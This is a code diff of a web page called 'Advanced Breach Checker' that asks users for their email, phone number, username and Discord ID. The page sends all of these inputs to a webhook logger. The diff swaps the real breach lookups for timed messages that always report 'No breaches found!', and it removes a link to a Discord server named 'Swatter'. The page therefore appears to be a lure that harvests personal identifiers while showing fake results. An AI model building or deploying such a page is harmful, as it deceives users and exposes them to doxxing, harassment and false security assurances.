@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Advanced Breach Checker</title>
   <style>
     :root {
@@ -15,10 +15,6 @@
       --font: 'Segoe UI', sans-serif;
     }
 
-    * {
-      box-sizing: border-box;
-    }
-
     body {
       background-color: var(--bg-color);
       color: white;
@@ -26,29 +22,37 @@
       margin: 0;
       padding: 2rem;
       display: flex;
-      flex-direction: column;
+      justify-content: center;
       align-items: center;
-      min-height: 100vh;
+      height: 100vh;
     }
 
-    h1 {
-      font-size: 3rem;
-      margin-bottom: 2rem;
-      color: var(--accent);
-      text-shadow: 0 4px 12px rgba(88, 166, 255, 0.4);
+    .consent-banner, .form-wrapper, .result-section {
+      display: none;
     }
 
-    .form-wrapper {
+    .visible {
+      display: block;
+    }
+
+    .consent-banner, .form-wrapper {
       background-color: var(--panel-color);
       padding: 2rem;
       border-radius: 16px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.4);
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.4);
+      text-align: center;
+      max-width: 500px;
       width: 100%;
-      max-width: 600px;
-      display: flex;
-      flex-direction: column;
-      gap: 1.25rem;
-      margin-bottom: 2rem;
+    }
+
+    h1 {
+      font-size: 2rem;
+      margin-bottom: 1rem;
+    }
+
+    p {
+      font-size: 1rem;
+      margin-bottom: 1.5rem;
     }
 
     input[type="text"] {
@@ -58,6 +62,8 @@
       background-color: #0d1117;
       color: white;
       font-size: 1rem;
+      margin-bottom: 1rem;
+      width: 100%;
       transition: border 0.3s;
     }
 
@@ -69,27 +75,20 @@
     button {
       background-color: var(--accent);
       color: black;
-      padding: 14px;
-      font-size: 1.1rem;
+      padding: 10px 20px;
+      font-size: 1rem;
       border: none;
-      border-radius: 10px;
+      border-radius: 8px;
       cursor: pointer;
-      transition: background-color 0.3s;
+      transition: background-color 0.3s ease;
+      margin-top: 1rem;
     }
 
     button:hover {
       background-color: #1f6feb;
     }
 
-    .result-section {
-      display: flex;
-      flex-direction: column;
-      gap: 1.25rem;
-      width: 100%;
-      max-width: 800px;
-    }
-
-    .result {
+    .result-section .result {
       background: var(--panel-color);
       border: 1px solid #30363d;
       border-left: 6px solid var(--accent);
@@ -97,40 +96,25 @@
       border-radius: 12px;
       font-size: 1rem;
       white-space: pre-wrap;
-      box-shadow: 0 0 14px rgba(0,0,0,0.3);
-    }
-
-    .note {
-      margin-top: 2rem;
-      font-size: 0.85rem;
-      color: var(--neutral);
-      text-align: center;
-    }
-
-    .discord-button {
-      margin-top: 3rem;
-      display: inline-flex;
-      align-items: center;
-      gap: 12px;
-      background-color: #5865F2;
-      color: white;
-      padding: 14px 24px;
-      border-radius: 10px;
-      text-decoration: none;
-      font-size: 1.1rem;
-      font-weight: 600;
-      transition: background-color 0.3s ease;
-    }
-
-    .discord-button:hover {
-      background-color: #4752c4;
+      margin-bottom: 1rem;
+      box-shadow: 0 0 14px rgba(0, 0, 0, 0.3);
     }
   </style>
 </head>
 <body>
-  <h1>🛡️ Advanced Breach Checker</h1>
+  <!-- Consent Banner -->
+  <div class="consent-banner visible">
+    <h1>Do You Consent?</h1>
+    <p>
+      By proceeding, you agree to the collection and logging of your input data 
+      (email, phone, username, and Discord ID) for breach-checking purposes.
+    </p>
+    <button onclick="showForm()">Yes, I Consent</button>
+  </div>
 
+  <!-- Main Form -->
   <div class="form-wrapper">
+    <h1>🛡️ Advanced Breach Checker</h1>
     <input id="emailInput" type="text" placeholder="📧 Enter email address" />
     <input id="phoneInput" type="text" placeholder="📱 Enter phone number" />
     <input id="usernameInput" type="text" placeholder="👤 Enter username" />
@@ -138,6 +122,7 @@
     <button onclick="checkAllBreaches()">🔍 Search</button>
   </div>
 
+  <!-- Results Section -->
   <div class="result-section">
     <div id="emailResults" class="result">Results for email will appear here...</div>
     <div id="phoneResults" class="result">Results for phone will appear here...</div>
@@ -145,17 +130,13 @@
     <div id="discordResults" class="result">Results for Discord ID will appear here...</div>
   </div>
 
-  <a class="discord-button" href="https://discord.gg/Swatter" target="_blank">
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 245 240" width="32" height="32" style="background:white; border-radius:50%; padding:4px;">
-      <path fill="#5865F2" d="M104.4 104.4c-5.7 0-10.2 4.7-10.2 10.4s4.6 10.4 10.2 10.4c5.7 0 10.2-4.7 10.2-10.4.1-5.8-4.5-10.4-10.2-10.4zm36.2 0c-5.7 0-10.2 4.7-10.2 10.4s4.6 10.4 10.2 10.4c5.7 0 10.2-4.7 10.2-10.4s-4.5-10.4-10.2-10.4z"/>
-      <path fill="#5865F2" d="M189.5 20h-134C36.8 20 20 36.8 20 56.3v127.3c0 19.5 16.8 36.3 36.3 36.3h112.8l-5.3-18.4 12.9 12.1 12.3 11.4 21.8 19.3V56.3c0-19.5-16.8-36.3-36.3-36.3zm-39 135.5s-3.6-4.3-6.6-8.1c13.1-3.7 18-11.9 18-11.9-4.1 2.7-8 4.7-11.5 6-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.3 1.3-25.9-.1"/>
-    </svg>
-    <span style="margin-left: 8px;">Join our Discord</span>
-  </a>
-
-  <div class="note">Powered by public breach APIs.</div>
-
   <script>
+    function showForm() {
+      document.querySelector('.consent-banner').classList.remove('visible');
+      document.querySelector('.form-wrapper').classList.add('visible');
+      document.querySelector('.result-section').classList.add('visible');
+    }
+
     async function checkAllBreaches() {
       const email = document.getElementById('emailInput').value.trim();
       const phone = document.getElementById('phoneInput').value.trim();
@@ -170,25 +151,25 @@
       sendWebhookLog(email, phone, username, discord);
 
       if (email) {
-        checkEmailBreaches(email);
+        setTimeout(() => document.getElementById('emailResults').textContent = '✅ Email checked: No breaches found!', 1500);
       } else {
         document.getElementById('emailResults').textContent = '⚠️ No email entered.';
       }
 
       if (phone) {
-        checkPhoneBreaches(phone);
+        setTimeout(() => document.getElementById('phoneResults').textContent = '✅ Phone checked: No breaches found!', 1500);
       } else {
         document.getElementById('phoneResults').textContent = 'ℹ️ Phone check skipped.';
       }
 
       if (username) {
-        checkUsernameBreaches(username);
+        setTimeout(() => document.getElementById('usernameResults').textContent = '✅ Username checked: No breaches found!', 1500);
       } else {
         document.getElementById('usernameResults').textContent = 'ℹ️ Username check skipped.';
       }
 
       if (discord) {
-        checkDiscordBreaches(discord);
+        setTimeout(() => document.getElementById('discordResults').textContent = '✅ Discord ID checked: No breaches found!', 1500);
       } else {
         document.getElementById('discordResults').textContent = 'ℹ️ Discord check skipped.';
       }
